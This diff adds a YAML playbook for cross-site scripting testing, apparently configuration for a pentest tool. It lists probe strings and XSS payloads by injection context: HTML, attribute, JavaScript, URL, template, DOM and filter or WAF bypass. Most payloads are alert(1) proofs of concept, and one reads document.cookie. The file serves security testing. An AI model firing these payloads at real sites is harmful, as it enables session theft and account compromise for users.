@@ -1,0 +1,276 @@
+name: XSS Context Playbook
+
+steps:
+
+# =========================================================
+# [1] PROBE CONTEXT
+# =========================================================
+- title: Probe Context
+  mode: enum
+  info: |
+    Identify where input is reflected and how it is handled.
+
+  entries:
+
+    - cmd: "<test>"
+      info: html reflection
+      look_for:
+        - reflected input
+        - encoded chars
+        - stripped tags
+
+    - cmd: "\""
+      info: double quote break
+      look_for:
+        - broken attributes
+        - syntax errors
+
+    - cmd: "'"
+      info: single quote break
+      look_for:
+        - quote escape
+        - malformed html/js
+
+    - cmd: "</script>"
+      info: script break
+      look_for:
+        - broken javascript
+        - reflection inside script tag
+
+    - cmd: "-->"
+      info: comment break
+      look_for:
+        - html comment context
+
+    - cmd: "${7*7}"
+      info: template probe
+      look_for:
+        - evaluated expressions
+        - 49 output
+
+    - cmd: "javascript:alert(1)"
+      info: url probe
+      look_for:
+        - href reflection
+        - blocked protocols
+
+  notes:
+    - identify reflection context before payload escalation
+    - test filtering and encoding behavior
+
+
+# =========================================================
+# [2] HTML INJECTION
+# =========================================================
+- title: HTML Injection
+  mode: enum
+  info: |
+    Payloads for direct HTML body injection.
+
+  entries:
+
+    - cmd: "<img src=x onerror=alert(1)>"
+      info: img onerror
+
+    - cmd: "<svg/onload=alert(1)>"
+      info: svg onload
+
+    - cmd: "<script>alert(1)</script>"
+      info: script tag
+
+    - cmd: "</p><img src=x onerror=alert(1)>"
+      info: break tag
+
+    - cmd: "<><img src=1 onerror=alert(1)>"
+      info: malformed tag bypass
+
+    - cmd: "</script><script>alert(1)</script>"
+      info: script escape
+
+  notes:
+    - useful inside reflected HTML
+    - try closing existing tags first
+
+
+# =========================================================
+# [3] ATTRIBUTE INJECTION
+# =========================================================
+- title: Attribute Injection
+  mode: enum
+  info: |
+    Break out of HTML attributes and inject events.
+
+  entries:
+
+    - cmd: "\"><img src=x onerror=alert(1)>"
+      info: break double quote
+
+    - cmd: "'><img src=x onerror=alert(1)>"
+      info: break single quote
+
+    - cmd: "\" onmouseover=alert(1) x=\""
+      info: mouseover event
+
+    - cmd: "' onfocus=alert(1) autofocus '"
+      info: autofocus trigger
+
+    - cmd: "\" autofocus onfocus=alert(1) x=\""
+      info: focus trigger
+
+    - cmd: "\"onmouseover=\"alert(1)"
+      info: inline event
+
+    - cmd: "onmouseover=alert(1)"
+      info: naked handler
+
+  notes:
+    - look for input reflected inside attributes
+    - event handlers often bypass filters
+
+
+# =========================================================
+# [4] JAVASCRIPT INJECTION
+# =========================================================
+- title: JavaScript Injection
+  mode: enum
+  info: |
+    Escape JavaScript strings and execute code.
+
+  entries:
+
+    - cmd: "alert(1)"
+      info: direct execution
+
+    - cmd: "';alert(1);//"
+      info: single quote break
+
+    - cmd: "\";alert(1);//"
+      info: double quote break
+
+    - cmd: "'-alert(1)-'"
+      info: expression injection
+
+    - cmd: "';confirm(1);//"
+      info: confirm test
+
+    - cmd: '\\\"-alert(1)}//'
+      info: escaped quote bypass
+
+    - cmd: "\\\\'-alert(1)//"
+      info: escaped single quote
+
+    - cmd: "</script><script>alert(1)</script>"
+      info: break script tag
+
+  notes:
+    - useful inside script blocks or inline JS
+    - observe syntax errors in browser console
+
+# =========================================================
+# [5] URL INJECTION
+# =========================================================
+- title: URL Injection
+  mode: enum
+  info: |
+    Abuse href/src style contexts.
+
+  entries:
+
+    - cmd: "javascript:alert(1)"
+      info: javascript protocol
+
+    - cmd: "javascript:print()"
+      info: print test
+
+    - cmd: "javascript:alert(document.cookie)"
+      info: cookie access
+
+    - cmd: "data:text/html,<script>alert(1)</script>"
+      info: data uri payload
+
+  notes:
+    - useful in href/src attributes
+    - "many apps block javascript: but not data:"
+
+
+# =========================================================
+# [6] TEMPLATE INJECTION
+# =========================================================
+- title: Template Injection
+  mode: enum
+  info: |
+    Detect client-side template injection.
+
+  entries:
+
+    - cmd: "{{7*7}}"
+      info: expression test
+      look_for:
+        - 49 output
+
+    - cmd: "{{$on.constructor('alert(1)')()}}"
+      info: angular escape
+
+    - cmd: "${alert(1)}"
+      info: template literal
+
+  notes:
+    - test simple math payloads first
+    - look for evaluated expressions
+
+
+# =========================================================
+# [7] DOM XSS
+# =========================================================
+- title: DOM XSS
+  mode: enum
+  info: |
+    Test DOM sinks and client-side rendering.
+
+  entries:
+
+    - cmd: "<img src=x onerror=alert(1)>"
+      info: html sink
+
+    - cmd: "<svg/onload=alert(1)>"
+      info: svg sink
+
+    - cmd: "\"><img src=x onerror=alert(1)>"
+      info: attribute break
+
+    - cmd: "><svg onload=alert(1)>"
+      info: tag injection
+
+  notes:
+    - inspect sources like:
+      - innerHTML
+      - document.write
+      - location.hash
+    - use browser devtools heavily
+
+
+# =========================================================
+# [8] FILTER BYPASS
+# =========================================================
+- title: Filter Bypass
+  mode: enum
+  info: |
+    Payloads for weak filtering and WAF bypass.
+
+  entries:
+
+    - cmd: "<svg/onload=alert(1)>"
+      info: svg bypass
+
+    - cmd: "<><img src=x onerror=alert(1)>"
+      info: malformed html
+
+    - cmd: "<iframe src=javascript:alert(1)>"
+      info: iframe payload
+
+    - cmd: "<math><mi//xlink:href=\"javascript:alert(1)\">"
+      info: mathml bypass
+
+  notes:
+    - try malformed syntax
+    - browsers parse invalid HTML surprisingly well
